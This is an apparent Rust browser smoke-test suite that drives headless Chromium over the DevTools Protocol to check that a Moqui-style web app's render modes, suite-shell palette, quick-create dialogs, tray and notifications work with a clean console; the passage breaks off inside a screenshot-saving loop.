/*
 * This software is in the public domain under CC0 1.0 Universal plus a
 * Grant of Patent License.
 *
 * To the extent possible under law, the author(s) have dedicated all
 * copyright and related and neighboring rights to this software to the
 * public domain worldwide. This software is distributed without any
 * warranty.
 *
 * You should have received a copy of the CC0 Public Domain Dedication
 * along with this software (see the LICENSE.md file). If not, see
 * <http://creativecommons.org/publicdomain/zero/1.0/>.
 */

//! Gate 3 browser smoke: headless Chromium over the DevTools Protocol (`common/cdp.rs`) against the seeded server of `gate3.rs`.
//!
//! Each kept mode is loaded in the browser: `html` (with `moqui-html.js`), `html-print`, `text`, `csv` and `xml` (fetched by the page),
//! server-merged `qvt` through the `/qapps` shell, and server-static `qvt` with its `/actions` package. Each page must render its fixture
//! content with a clean console: no uncaught exception, no `console.error` or `console.warn`, and no error or warning log entry (a failed
//! request is one). The client features the macros bind are driven as a user would: dialogs, click to edit, a background submit, the
//! column picker, a form post with the session token, Quasar menus and popups, the lazy Chart.js and Mermaid, and the pages and sort of a
//! form-list. The server-static compatibility report, and the fixture's clean verdict in it, is `it::qvt_report`.
//!
//! The browser is `pdf-chromium-path`, else `chromium`, `chromium-browser` or `google-chrome` on the `PATH`. A missing binary fails.

#![cfg(all(unix, feature = "embedded-postgres", feature = "axum"))]

mod common;

// the example component loads with the repository runtime; link its tool factory as the moqui binary does
use example as _;

use std::time::Duration;

use common::cdp::{Browser, Problem};
use common::{start, start_with, start_with_conf, start_with_data, FIXTURE};

const WAIT: Duration = Duration::from_secs(30);

/// Records every `fetch` of the page with its answer, as `window.__gate.fetches`.
const FETCH_SPY: &str = r#"(() => {
    if (window.__gate) return true;
    window.__gate = { fetches: [] };
    const original = window.fetch.bind(window);
    window.fetch = (input, init) => original(input, init).then((response) => {
        const url = String((input && input.url) || input);
        const method = (init && init.method) || (input && input.method) || "GET";
        // the fields a form posted, for a check of what a request carried
        const body = init && init.body;
        const sent = body && typeof body.entries === "function" ? Array.from(body.entries()).map(([key, value]) => key + "=" + value)
            : typeof body === "string" ? body.split("&").map((pair) => { try { return decodeURIComponent(pair.replace(/\+/g, " ")); } catch (err) { return pair; } }) : [];
        response.clone().text().then((body) => window.__gate.fetches.push({ url, method, status: response.status, body, sent }));
        return response;
    });
    return true;
})()"#;

/// The first visible element among `selector` whose trimmed text, or its last line (after the ligature of a Material icon), is `text`,
/// ignoring case (`innerText` follows `text-transform`, and Quasar buttons are upper case).
fn by_text(selector: &str, text: &str) -> String {
    let text = text.to_lowercase();
    format!(
        "Array.from(document.querySelectorAll({selector:?})).find((el) => {{ if (el.offsetParent === null || !el.innerText) return false; \
         const shown = el.innerText.trim().toLowerCase(); return shown === {text:?} || shown.split('\\n').pop().trim() === {text:?}; }})"
    )
}

fn assert_clean(browser: &mut Browser, page: &str) {
    let problems: Vec<Problem> = browser.take_problems();
    assert!(problems.is_empty(), "{page}: the console is not clean: {problems:#?}");
}

/// The answer of the last recorded fetch whose URL contains `part`, once there is one.
fn fetched(browser: &mut Browser, what: &str, part: &str) -> serde_json::Value {
    browser.wait_for(
        what,
        &format!("window.__gate.fetches.filter((f) => f.url.indexOf({part:?}) >= 0).slice(-1)[0] || null"),
        WAIT,
    )
}

fn sign_in(browser: &mut Browser, base: &str) {
    browser.navigate(&format!("{base}/Login"));
    browser.eval(
        "(() => { const form = document.getElementById('login_form'); form.username.value = 'john.doe'; \
         form.password.value = 'moqui'; form.requestSubmit(); return true; })()",
    );
    browser.wait_event("Page.loadEventFired", WAIT);
    browser.wait_for(
        "signed in",
        "location.pathname !== '/Login' && document.readyState === 'complete'",
        WAIT,
    );
    assert_clean(browser, "/Login");
}

#[test]
fn the_server_merged_modes_render_in_chromium_with_a_clean_console() {
    let gate = start("browser");
    let base = format!("http://{}", gate.server.address());
    let mut browser = Browser::launch();
    sign_in(&mut browser, &base);
    html_fixture(&mut browser, &base);
    html_widgets(&mut browser, &base);
    print_and_text_modes(&mut browser, &base);
    qapps_fixture(
        &mut browser,
        &base,
        &gate,
        "Posted from Chromium",
        ("AUTHZA_CREATE", "Create"),
    );
    qapps_widgets(&mut browser, &base);
}

#[test]
fn server_static_qvt_renders_in_chromium_with_its_actions_data() {
    let gate = start_with("browser-static", true);
    let base = format!("http://{}", gate.server.address());
    let mut browser = Browser::launch();
    sign_in(&mut browser, &base);
    static_fixture(&mut browser, &base);
    qapps_fixture(
        &mut browser,
        &base,
        &gate,
        "System App (via root screen)",
        ("AUTHZA_VIEW", "View"),
    );
    static_list(&mut browser, &base);
}

/// With `webapp_qvt_static_only=true` the page loads Vue without its compiler, and a policy of `script-src 'self'` (no `unsafe-eval`, no inline
/// script) holds: the shell and the components run their precompiled render functions and the static screen its server-compiled one.
#[test]
fn server_static_qvt_runs_on_the_runtime_build_under_a_policy_without_eval() {
    let gate = start_with_conf(
        "browser-runtime",
        r#"<webapp-list><webapp name="webroot">
            <response-header type="screen-render" name="Content-Security-Policy" value="frame-ancestors 'none'; form-action 'self'; script-src 'self'"/>
        </webapp></webapp-list>"#,
        &[("webapp_qvt_static_only", "true")],
    );
    let base = format!("http://{}", gate.server.address());
    let mut browser = Browser::launch();
    // the screen first, so the login goes back to it: every screen this page shows must be server-static, and the app list is not
    let page = format!("{base}/qapps/GateStaticList");
    browser.navigate(&page);
    browser.wait_for(
        "the login page",
        "location.pathname === '/Login' && document.readyState === 'complete'",
        WAIT,
    );
    browser.eval(
        "(() => { const form = document.getElementById('login_form'); form.username.value = 'john.doe'; \
         form.password.value = 'moqui'; form.requestSubmit(); return true; })()",
    );
    browser.wait_event("Page.loadEventFired", WAIT);
    browser.wait_for("the list", "/1-20 \\/ \\d+/.test(document.body.innerText)", WAIT);
    assert_eq!(
        browser.eval("!!document.querySelector('script[src*=\"vue.runtime.global.prod.js\"]') && !document.querySelector('script[src*=\"vue.global.prod.js\"]')"),
        true
    );
    // the shell drew its menu and toolbar, and the list its rows
    let text = browser.eval("document.body.innerText");
    let text = text.as_str().unwrap();
    assert!(
        text.contains("Enumerations of john.doe") && text.contains("Static List"),
        "{text}"
    );
    assert_clean(&mut browser, &page);
}

#[test]
fn a_notification_sent_on_the_server_shows_in_the_html_and_qapps_pages() {
    let gate = start("browser-notify");
    let base = format!("http://{}", gate.server.address());
    let mut browser = Browser::launch();
    // not signed in: the login page names no endpoint and opens no socket
    browser.navigate(&format!("{base}/Login"));
    browser.wait_for("moqui-html.js bound the page", "!!window.moqui", WAIT);
    assert_eq!(
        browser.eval("!document.querySelector('meta[name=moqui-notify]') && !window.moqui.notificationSocket"),
        true
    );
    assert_clean(&mut browser, "/Login before sign in");
    sign_in(&mut browser, &base);
    let user_id = user_id_of(&gate, "john.doe");

    // html: a toast from moqui-html.js
    browser.navigate(&format!("{base}/apps{FIXTURE}.html?artifactGroupId=SYSTEM_APP"));
    browser.wait_for(
        "the notification socket is open",
        "!!(window.moqui && moqui.notificationSocket && moqui.notificationSocket.readyState === 1)",
        WAIT,
    );
    let shown = notify_until_shown(
        &mut browser,
        &gate,
        &user_id,
        "Html",
        "Array.from(document.querySelectorAll('#toasts .alert')).map((el) => el.textContent).find((text) => text.indexOf('Gate note Html') >= 0) || null",
    );
    assert!(shown.contains("Gate note Html"), "{shown}");
    assert_eq!(
        browser.eval("!!document.querySelector('#toasts .alert[data-type=success] a[href=\"/qapps/System\"]')"),
        true
    );
    assert_clean(&mut browser, "html notification");

    // qvt: a Quasar notify from the WebrootVue client, and the notification history of the shell
    browser.navigate(&format!("{base}/qapps{FIXTURE}?artifactGroupId=SYSTEM_APP"));
    browser.wait_for(
        "the notification socket is open",
        "!!(window.moqui && moqui.webrootVue && moqui.webrootVue.notificationClient && moqui.webrootVue.notificationClient.webSocket \
         && moqui.webrootVue.notificationClient.webSocket.readyState === 1)",
        WAIT,
    );
    let shown = notify_until_shown(
        &mut browser,
        &gate,
        &user_id,
        "Qvt",
        "Array.from(document.querySelectorAll('.q-notification')).map((el) => el.innerText).find((text) => text.indexOf('Gate note Qvt') >= 0) || null",
    );
    assert!(shown.contains("Gate note Qvt"), "{shown}");
    assert_eq!(
        browser.eval(
            "moqui.webrootVue.notifyHistoryList.some((item) => String(item.message).indexOf('Gate note Qvt') >= 0)"
        ),
        true
    );
    assert_clean(&mut browser, "qvt notification");
}

/// A key with modifiers (CDP: 1 Alt, 2 Ctrl, 4 Meta, 8 Shift) as a keydown that types nothing, then its keyup.
fn key_chord(browser: &mut Browser, key: &str, code: &str, key_code: i64, modifiers: i64) {
    for kind in ["rawKeyDown", "keyUp"] {
        browser.call(
            "Input.dispatchKeyEvent",
            serde_json::json!({"type": kind, "key": key, "code": code, "windowsVirtualKeyCode": key_code, "modifiers": modifiers}),
        );
    }
    browser.pump(Duration::from_millis(150));
}

fn ctrl_k(browser: &mut Browser) {
    key_chord(browser, "k", "KeyK", 75, 2);
}

/// Replace the palette's text: select what is there, then type over it.
fn palette_text(browser: &mut Browser, text: &str) {
    browser.eval("(() => { const input = document.getElementById('m-palette-input'); input.focus(); input.select(); return true; })()");
    browser.type_text(text);
}

/// The text of the palette's rows, once one has `shown`.
fn palette_row(browser: &mut Browser, what: &str, shown: &str) -> String {
    let found = browser.wait_for(
        what,
        &format!(
            "Array.from(document.querySelectorAll('#m-palette .q-item')).map((el) => el.innerText).find((text) => text.indexOf({shown:?}) >= 0) || null"
        ),
        WAIT,
    );
    found.as_str().unwrap_or_default().to_string()
}

/// The suite shell of `/qapps` (IronStone impl-drawers-commons M1) over the gallery's shell providers, without BOSS: the
/// launcher and the app title, Ctrl+K and the palette (a screen by title, the gallery's palette source by its `~` prefix,
/// `:` and Enter to open), the `+` menu and the quick-create dialog with the screen context's record, closing when its form
/// submits, and the keys (`?` and the gallery's `g w`). No tray, counters, Mail or Messages without the theme values. The console
/// stays clean. With `MOQUI_SHELL_SHOTS=<dir>` it saves PNGs of the header with the palette and the `+` menu open, light
/// and dark, 1280 and 390 px wide.
#[test]
fn the_suite_shell_palette_quick_create_and_keys_work_in_chromium() {
    let gate = start("browser-shell");
    let base = format!("http://{}", gate.server.address());
    let mut browser = Browser::launch();
    sign_in(&mut browser, &base);
    let detail = format!("{base}/qapps/gallery/Detail?enumId=STT_INTERNAL_QUASAR");
    browser.navigate(&detail);
    browser.wait_for(
        "the shell data",
        "!!(window.moqui && moqui.webrootVue && moqui.webrootVue.shellData && moqui.webrootVue.shellData.apps.some((app) => app.name === 'gallery'))",
        WAIT,
    );
    browser.wait_for(
        "the record of the screen context",
        "(moqui.webrootVue.screenRecord || {}).id === 'STT_INTERNAL_QUASAR'",
        WAIT,
    );
    browser.eval(FETCH_SPY);
    // the header: the current app's title, the launcher with the apps, Search; no tray, counters, Mail or Messages without BOSS's
    // theme values, and the notify history stays
    let header = browser.eval("document.getElementById('top').innerText");
    assert!(header.as_str().unwrap().contains("Gallery"), "{header}");
    // the breadcrumbs are the path from the app root: not Applications, nor the app title the header shows
    browser.wait_for(
        "the breadcrumbs",
        "(document.getElementById('m-breadcrumbs') || {}).innerText !== undefined && document.getElementById('m-breadcrumbs').innerText.indexOf('Detail') >= 0",
        WAIT,
    );
    let crumbs = browser.eval("document.getElementById('m-breadcrumbs').innerText");
    let crumbs = crumbs.as_str().unwrap_or_default();
    assert!(
        !crumbs.contains("Applications") && !crumbs.contains("Gallery"),
        "{crumbs}"
    );
    assert_eq!(
        browser.eval(
            "!!document.getElementById('m-launcher') && !!document.getElementById('m-search') && !document.querySelector('[id^=m-counter-]') \
             && !document.getElementById('m-tray') && moqui.webrootVue.trayTabs.length === 0"
        ),
        true
    );
    browser.click("the launcher", "document.getElementById('m-launcher')");
    browser.wait_for(
        "the launcher's apps",
        "!!document.querySelector('.m-launcher .m-launcher-current') && document.querySelector('.m-launcher').innerText.indexOf('All applications') >= 0",
        WAIT,
    );
    browser.press("Escape");
    browser.wait_for("the launcher closed", "!document.querySelector('.m-launcher')", WAIT);

    // the app title opens the menu of the app's top-level screens, the menu the app-root breadcrumb had
    browser.click("the app screens", "document.getElementById('m-app-screens')");
    browser.wait_for(
        "the top-level screens",
        "!!document.querySelector('.q-menu') && document.querySelector('.q-menu').innerText.indexOf('Detail') >= 0 \
         && document.querySelector('.q-menu').innerText.indexOf('Widgets') >= 0",
        WAIT,
    );
    browser.press("Escape");
    browser.wait_for("the app screens closed", "!document.querySelector('.q-menu')", WAIT);

    // Ctrl+K: the palette with its input focused; a screen by its title
    ctrl_k(&mut browser);
    browser.wait_for(
        "the palette",
        "!!document.getElementById('m-palette') && document.activeElement && document.activeElement.id === 'm-palette-input'",
        WAIT,
    );
    browser.type_text("widget");
    let row = palette_row(&mut browser, "the Widgets screen", "Widgets");
    assert!(row.contains("Gallery"), "the app is the subtitle: {row}");
    palette_row(&mut browser, "the gallery's palette action", "Open the widget gallery");
    // the gallery's palette source by its prefix: shellSearch with its group only
    palette_text(&mut browser, "~Quasar");
    palette_row(
        &mut browser,
        "a row of the gallery's palette source",
        "Internal Applications - Quasar",
    );
    let searched = fetched(&mut browser, "the palette search", "/shellSearch");
    let url = searched["url"].as_str().unwrap();
    assert!(
        url.contains("groups=GalleryEnumerations") && url.contains("text=Quasar"),
        "{url}"
    );
    assert_eq!(searched["status"], 200, "{searched}");
    assert_eq!(
        browser.eval("Array.from(document.querySelectorAll('#m-palette .q-item__label--header')).map((el) => el.innerText.trim()).join('|')"),
        "Enumerations"
    );
    // : is the screens alone, and Enter opens the first
    palette_text(&mut browser, ":widgets");
    palette_row(&mut browser, "the Widgets screen alone", "Widgets");
    browser.press("Enter");
    browser.wait_for(
        "the Widgets screen",
        "location.pathname === '/qapps/gallery/Widgets'",
        WAIT,
    );
    browser.wait_for("the palette closed", "!document.getElementById('m-palette')", WAIT);
    assert_clean(&mut browser, "the palette");

    // the + menu on a record: the gallery's kind; its dialog gets the record of the screen context and closes on save
    browser.navigate(&detail);
    browser.wait_for(
        "the record of the screen context",
        "!!(moqui.webrootVue && moqui.webrootVue.shellData && (moqui.webrootVue.screenRecord || {}).id === 'STT_INTERNAL_QUASAR')",
        WAIT,
    );
    browser.eval(FETCH_SPY);
    browser.click("the + menu", "document.getElementById('m-quick-create-menu')");
    browser.click(
        "the gallery's quick-create kind",
        &by_text(".q-menu .q-item", "Gallery note"),
    );
    browser.wait_for(
        "the quick-create dialog with the record",
        "!!document.getElementById('m-quick-create') && document.getElementById('m-quick-create').innerText.indexOf('On moqui.basic.Enumeration STT_INTERNAL_QUASAR') >= 0",
        WAIT,
    );
    assert_eq!(
        browser.eval("moqui.webrootVue.assistReach.join(',')"),
        "m-canvas,m-quick-create"
    );
    browser.click("the note field", "document.querySelector('#m-quick-create textarea')");
    browser.type_text("From the gate");
    browser.click("Save", &by_text("#m-quick-create button", "Save"));
    browser.wait_for(
        "the note's message",
        "Array.from(document.querySelectorAll('.q-notification')).some((el) => el.innerText.indexOf('the note would be saved on moqui.basic.Enumeration STT_INTERNAL_QUASAR') >= 0)",
        WAIT,
    );
    browser.wait_for("the dialog closed", "!document.getElementById('m-quick-create')", WAIT);
    let posted = fetched(&mut browser, "the note post", "/saveNote");
    assert_eq!(posted["status"], 200, "{posted}");
    assert!(
        posted["sent"].to_string().contains("recordId=STT_INTERNAL_QUASAR"),
        "{posted}"
    );
    assert_clean(&mut browser, "quick create");

    // the keys: ? lists them, with the gallery's own; g then w goes to the widgets
    browser.eval("document.activeElement && document.activeElement.blur && document.activeElement.blur(), true");
    key_chord(&mut browser, "?", "Slash", 191, 8);
    browser.wait_for(
        "the keys overlay",
        "!!document.getElementById('m-keys-help') && document.getElementById('m-keys-help').innerText.indexOf('Go to the widgets') >= 0",
        WAIT,
    );
    browser.press("Escape");
    browser.wait_for("the overlay closed", "!document.getElementById('m-keys-help')", WAIT);
    browser.eval("document.activeElement && document.activeElement.blur && document.activeElement.blur(), true");
    key_chord(&mut browser, "g", "KeyG", 71, 0);
    key_chord(&mut browser, "w", "KeyW", 87, 0);
    browser.wait_for(
        "g w went to the widgets",
        "location.pathname === '/qapps/gallery/Widgets'",
        WAIT,
    );
    assert_clean(&mut browser, "the keys");

    if let Some(dir) = std::env::var_os("MOQUI_SHELL_SHOTS") {
        shell_shots(&mut browser, &detail, std::path::Path::new(&dir));
    }
}

/// A `.qvue` screen that the theme and the provider name without its extension (the gallery's QuickTask, `render-modes="qvue"`)
/// loads as qvue in a tray tab and in the quick-create dialog: `moqui.loadComponent` asks for `.qvt` with `X-Moqui-Client-Modes`
/// and the server answers the qvue. The component reads its own query and path through `inject: ["mScreen"]`, the tray's
/// `shellCounts` refresh calls its `shellRefresh()` instead of mounting it again (what was typed stays), and its Discard asks with
/// `$q.dialog` (Quasar's Dialog plugin).
#[test]
fn a_qvue_screen_loads_in_the_tray_and_quick_create_and_refreshes_in_place_in_chromium() {
    let gate = start_with_data(
        "browser-qvue",
        r#"<entity-facade-xml type="seed">
            <moqui.screen.ScreenThemeResource screenThemeId="DEFAULT_QUASAR" sequenceNum="900" resourceTypeEnumId="STRT_TRAY_TODAY" resourceValue="gallery/QuickTask"/>
        </entity-facade-xml>"#,
    );
    let base = format!("http://{}", gate.server.address());
    let mut browser = Browser::launch();
    sign_in(&mut browser, &base);
    let detail = format!("{base}/qapps/gallery/Detail?enumId=STT_INTERNAL_QUASAR");
    browser.navigate(&detail);
    browser.wait_for(
        "the Today counter and the record of the screen context",
        "!!document.getElementById('m-counter-today') && !!moqui.webrootVue.shellData && (moqui.webrootVue.screenRecord || {}).id === 'STT_INTERNAL_QUASAR'",
        WAIT,
    );
    browser.eval(FETCH_SPY);
    browser.click("Today", "document.getElementById('m-counter-today')");
    browser.wait_for(
        "the qvue screen in the tray, with its own path",
        "!!document.querySelector('#m-tray #GalleryTaskStatus') && document.querySelector('#m-tray #GalleryTaskStatus').innerText.indexOf('/apps/gallery/QuickTask · refreshed 0') >= 0",
        WAIT,
    );
    let loaded = fetched(&mut browser, "the tray tab's load", "/apps/gallery/QuickTask.qvt");
    assert_eq!(loaded["status"], 200, "{loaded}");
    // what is typed stays through the refresh of a shellCounts push: the screen refreshes itself
    browser.click(
        "the task field",
        "document.querySelector('#m-tray [id=\"GalleryTask_taskName\"]')",
    );
    browser.type_text("kept");
    browser.eval("moqui.webrootVue.onShellNotification({topic: 'shellCounts', message: {today: 1}}), true");
    browser.wait_for(
        "refreshed in place",
        "document.querySelector('#m-tray #GalleryTaskStatus').innerText.indexOf('refreshed 1') >= 0 \
         && document.querySelector('#m-tray [id=\"GalleryTask_taskName\"]').value === 'kept'",
        WAIT,
    );
    browser.eval("moqui.webrootVue.closeTray(), true");

    // the + menu: the qvue kind gets the record of the screen context from its own query; Discard asks first
    browser.click("the + menu", "document.getElementById('m-quick-create-menu')");
    browser.click("the qvue kind", &by_text(".q-menu .q-item", "Gallery task"));
    browser.wait_for(
        "the qvue screen in the dialog with the record",
        "!!document.getElementById('m-quick-create') && document.getElementById('m-quick-create').innerText.indexOf('On moqui.basic.Enumeration STT_INTERNAL_QUASAR') >= 0",
        WAIT,
    );
    browser.click("Discard", &by_text("#m-quick-create button", "Discard"));
    browser.wait_for(
        "the confirmation of $q.dialog",
        "Array.from(document.querySelectorAll('.q-dialog')).some((el) => el.innerText.indexOf('Discard the task?') >= 0)",
        WAIT,
    );
    browser.click("OK", &by_text(".q-dialog button", "OK"));
    browser.wait_for(
        "the quick-create dialog closed",
        "!document.getElementById('m-quick-create')",
        WAIT,
    );
    // Save posts to the transition under the screen's own path, with the record
    browser.click("the + menu", "document.getElementById('m-quick-create-menu')");
    browser.click("the qvue kind", &by_text(".q-menu .q-item", "Gallery task"));
    browser.wait_for(
        "the qvue screen in the dialog",
        "!!document.querySelector('#m-quick-create [id=\"GalleryTask_taskName\"]')",
        WAIT,
    );
    browser.click(
        "the task field",
        "document.querySelector('#m-quick-create [id=\"GalleryTask_taskName\"]')",
    );
    browser.type_text("From the gate");
    browser.click("Save", &by_text("#m-quick-create button", "Save"));
    browser.wait_for(
        "the task's message",
        "Array.from(document.querySelectorAll('.q-notification')).some((el) => el.innerText.indexOf('the task \"From the gate\" would be saved on moqui.basic.Enumeration STT_INTERNAL_QUASAR') >= 0)",
        WAIT,
    );
    browser.wait_for("the dialog closed", "!document.getElementById('m-quick-create')", WAIT);
    let posted = fetched(&mut browser, "the task post", "/apps/gallery/QuickTask/saveTask");
    assert_eq!(posted["status"], 200, "{posted}");
    assert_clean(&mut browser, "a qvue screen in the tray and quick create");
}

/// The tray panel of the suite shell, with theme values on DEFAULT_QUASAR that name gallery screens as BOSS names its own
/// (`gallery/Panel` for Today, `gallery/Landing` for Notifications, `gallery/List` for Mail, `gallery/Split` for
/// Messages): the counters appear and the notify history goes; Today opens the tray with the Panel archetype inside it, in
/// Assist's reach; a tab is loaded once and kept, the tray stays open across navigation and Esc closes it; a `shellCounts`
/// message sets the badges; below 600 px Mail and Messages are one button, the tray tabs one tray button, the app title gives way
/// to the launcher and nothing overflows. With `MOQUI_SHELL_SHOTS=<dir>` it saves PNGs of the header and of the open tray, light
/// and dark, 1280 and 390 px wide.
#[test]
fn the_suite_shell_tray_shows_the_theme_screens_in_chromium() {
    let gate = start_with_data(
        "browser-tray",
        r#"<entity-facade-xml type="seed">
            <moqui.screen.ScreenThemeResource screenThemeId="DEFAULT_QUASAR" sequenceNum="900" resourceTypeEnumId="STRT_TRAY_TODAY" resourceValue="gallery/Panel"/>
            <moqui.screen.ScreenThemeResource screenThemeId="DEFAULT_QUASAR" sequenceNum="901" resourceTypeEnumId="STRT_TRAY_NOTIFICATIONS" resourceValue="gallery/Landing"/>
            <moqui.screen.ScreenThemeResource screenThemeId="DEFAULT_QUASAR" sequenceNum="902" resourceTypeEnumId="STRT_MAIL_SCREEN" resourceValue="gallery/List"/>
            <moqui.screen.ScreenThemeResource screenThemeId="DEFAULT_QUASAR" sequenceNum="903" resourceTypeEnumId="STRT_MESSAGES_SCREEN" resourceValue="gallery/Split"/>
        </entity-facade-xml>"#,
    );
    let base = format!("http://{}", gate.server.address());
    let mut browser = Browser::launch();
    sign_in(&mut browser, &base);
    let detail = format!("{base}/qapps/gallery/Detail?enumId=STT_INTERNAL_QUASAR");
    browser.navigate(&detail);
    browser.wait_for(
        "the counters",
        "!!document.getElementById('m-counter-today') && !!document.getElementById('m-counter-notifications') \
         && !!document.getElementById('m-counter-email') && !!document.getElementById('m-counter-messages')",
        WAIT,
    );
    // no Chat tab without its theme value, and the notify history gives way to the Notifications tab
    assert_eq!(
        browser.eval("!document.getElementById('m-counter-chat') && !document.querySelector('#top .q-btn i.q-icon[class*=notifications]') \
             && moqui.webrootVue.trayTabs.map((tab) => tab.key).join(',')"),
        "today,notifications"
    );
    browser.click("Today", "document.getElementById('m-counter-today')");
    browser.wait_for(
        "the Panel archetype in the tray",
        "!!document.getElementById('m-tray') && document.getElementById('m-tray').offsetParent !== null \
         && document.getElementById('m-tray').innerText.indexOf('Overdue') >= 0",
        WAIT,
    );
    assert_eq!(
        browser.eval("moqui.webrootVue.assistReach.join(',')"),
        "m-canvas,m-tray"
    );
    assert_eq!(
        browser.eval("!!document.getElementById('m-canvas').contains(document.getElementById('m-tray')) && Math.round(document.getElementById('m-tray').getBoundingClientRect().width)"),
        400
    );
    // the other tab, then back: Today was loaded once and kept
    browser.click("the Notifications tab", &by_text("#m-tray .q-tab", "Notifications"));
    browser.wait_for(
        "the Landing archetype in the tray",
        "document.getElementById('m-tray').innerText.indexOf('Archetype 3.1') >= 0",
        WAIT,
    );
    browser.eval("(document.querySelectorAll('#m-tray .m-tray-body')[0].firstElementChild.dataset.kept = 'yes'), true");
    browser.click("the Today tab", &by_text("#m-tray .q-tab", "Today"));
    browser.wait_for(
        "Today again, the same content",
        "!!document.querySelector('#m-tray .m-tray-body > [data-kept=yes]') && document.querySelector('#m-tray .m-tray-body > [data-kept=yes]').offsetParent !== null",
        WAIT,
    );
    // a shellCounts message sets the badges
    browser.eval("moqui.webrootVue.onShellNotification({topic: 'shellCounts', message: {today: 4, email: 120, messages: 2, notifications: 0, updates: 9}}), true");
    browser.wait_for(
        "the badges",
        "(document.querySelector('#m-counter-today .q-badge') || {}).innerText === '4' && (document.querySelector('#m-counter-email .q-badge') || {}).innerText === '99+' \
         && (document.querySelector('#m-counter-messages .q-badge') || {}).innerText === '2' && !document.querySelector('#m-counter-notifications .q-badge')",
        WAIT,
    );
    // the tray stays open across navigation; Esc closes it; the Mail and Messages counts are links
    // (a link of the canvas goes through setUrl)
    browser.eval("moqui.webrootVue.setUrl('/qapps/gallery/Landing'), true");
    browser.wait_for(
        "the Landing screen",
        "location.pathname === '/qapps/gallery/Landing' && moqui.webrootVue.loading === 0 \
         && document.getElementById('m-canvas').innerText.indexOf('Archetype 3.1') >= 0",
        WAIT,
    );
    assert_eq!(
        browser.eval("document.getElementById('m-tray').offsetParent !== null"),
        true
    );
    browser.eval("document.activeElement && document.activeElement.blur && document.activeElement.blur(), true");
    browser.press("Escape");
    browser.wait_for(
        "the tray closed",
        "document.getElementById('m-tray').offsetParent === null",
        WAIT,
    );
    // each screen is shown before the next click, so no load is aborted
    browser.click("the Messages count", "document.getElementById('m-counter-messages')");
    browser.wait_for(
        "the Messages screen",
        "location.pathname === '/qapps/gallery/Split' && moqui.webrootVue.loading === 0 \
         && document.getElementById('m-canvas').innerText.indexOf('Archetype 3.8') >= 0",
        WAIT,
    );
    browser.click("the Mail count", "document.getElementById('m-counter-email')");
    browser.wait_for(
        "the Mail screen",
        "location.pathname === '/qapps/gallery/List' && moqui.webrootVue.loading === 0 \
         && document.getElementById('m-canvas').innerText.indexOf('Archetype 3.2') >= 0",
        WAIT,
    );
    // below 600 px Mail and Messages are one button to the mail screen, its badge their sum
    browser.call(
        "Emulation.setDeviceMetricsOverride",
        serde_json::json!({"width": 390, "height": 844, "deviceScaleFactor": 1, "mobile": true}),
    );
    browser
        .eval("moqui.webrootVue.onShellNotification({topic: 'shellCounts', message: {email: 3, messages: 2}}), true");
    browser.wait_for(
        "one mail button",
        "!!document.getElementById('m-counter-mail') && !document.getElementById('m-counter-email') && !document.getElementById('m-counter-messages') \
         && (document.querySelector('#m-counter-mail .q-badge') || {}).innerText === '5'",
        WAIT,
    );
    browser.eval("moqui.webrootVue.setUrl('/qapps/gallery/Landing'), true");
    browser.wait_for(
        "the Landing screen",
        "location.pathname === '/qapps/gallery/Landing' && moqui.webrootVue.loading === 0 \
         && document.getElementById('m-canvas').innerText.indexOf('Archetype 3.1') >= 0",
        WAIT,
    );
    browser.click("the one mail button", "document.getElementById('m-counter-mail')");
    browser.wait_for(
        "the Mail screen",
        "location.pathname === '/qapps/gallery/List' && moqui.webrootVue.loading === 0 \
         && document.getElementById('m-canvas').innerText.indexOf('Archetype 3.2') >= 0",
        WAIT,
    );
    // at 390 px the launcher stands for the app title, Search is an icon, the tray tabs are one tray button (badge their sum)
    // that opens the tray, and nothing in the header overflows
    browser.eval("moqui.webrootVue.onShellNotification({topic: 'shellCounts', message: {today: 2, email: 3, messages: 2, notifications: 1}}), true");
    browser.wait_for(
        "one tray button",
        "!!document.getElementById('m-counter-tray') && !document.getElementById('m-counter-today') && !document.getElementById('m-counter-notifications') \
         && (document.querySelector('#m-counter-tray .q-badge') || {}).innerText === '3'",
        WAIT,
    );
    assert_eq!(
        browser.eval("(() => { const title = document.querySelector('#top .q-toolbar__title'); return !title || title.offsetParent === null; })()"),
        true,
        "no app title below 600 px"
    );
    assert_eq!(
        browser.eval("!document.querySelector('#m-search .q-btn__content .block')"),
        true,
        "Search is an icon"
    );
    let overflow = browser.eval(
        "(() => { const bar = document.querySelector('#top .q-toolbar'); const right = bar.getBoundingClientRect().right; \
         return Array.from(bar.children).filter((el) => el.offsetParent !== null && el.getBoundingClientRect().right > right + 1).map((el) => el.id || el.className).join(' | ') \
         + (bar.scrollWidth > bar.clientWidth + 1 ? ' scroll ' + bar.scrollWidth + '>' + bar.clientWidth : ''); })()",
    );
    assert_eq!(overflow, "", "nothing in the header overflows at 390 px");
    browser.click("the tray button", "document.getElementById('m-counter-tray')");
    browser.wait_for(
        "the tray from its button",
        "!!document.getElementById('m-tray') && document.getElementById('m-tray').offsetParent !== null",
        WAIT,
    );
    browser.click("the tray button again", "document.getElementById('m-counter-tray')");
    browser.wait_for(
        "the tray closed",
        "document.getElementById('m-tray').offsetParent === null",
        WAIT,
    );
    browser.call("Emulation.clearDeviceMetricsOverride", serde_json::json!({}));
    assert_clean(&mut browser, "the tray");

    if let Some(dir) = std::env::var_os("MOQUI_SHELL_SHOTS") {
        use base64::Engine as _;
        let dir = std::path::Path::new(&dir);
        std::fs::create_dir_all(dir).unwrap();
        for (width, height) in [(1280, 900), (390, 844)] {
            browser.call(
                "Emulation.setDeviceMetricsOverride",
                serde_json::json!({"width": width, "height": height, "deviceScaleFactor": 1, "mobile": width < 600}),
            );
            browser.navigate(&detail);
            browser.wait_for(
                "the counters",
                "!!document.getElementById('m-counter-today') || !!document.getElementById('m-counter-tray')",
                WAIT,
            );
            // the header alone first (the tray covers the canvas at 390 px, and a page keeps it open from the last)
            browser.eval("moqui.webrootVue.closeTray(), true");
            browser.pump(Duration::from_millis(500));
            let shot = browser.call("Page.captureScreenshot", serde_json::json!({"format": "png"}));
            let bytes = base64::engine::general_purpose::STANDARD
                .decode(shot["data"].as_str().unwrap())
                .unwrap();
            std::fs::write(dir.join(format!("header-{width}.png")), bytes).unwrap();
            for dark in [false, true] {
                let mode = if dark { "dark" } else { "light" };
                browser.eval(&format!(
                    "moqui.webrootVue.$q.dark.set({dark}), moqui.webrootVue.openTray('today'), true"
                ));
                browser.wait_for(
                    "the tray",
                    "!!document.getElementById('m-tray') && document.getElementById('m-tray').innerText.indexOf('Overdue') >= 0",
                    WAIT,
                );
                browser.pump(Duration::from_millis(500));
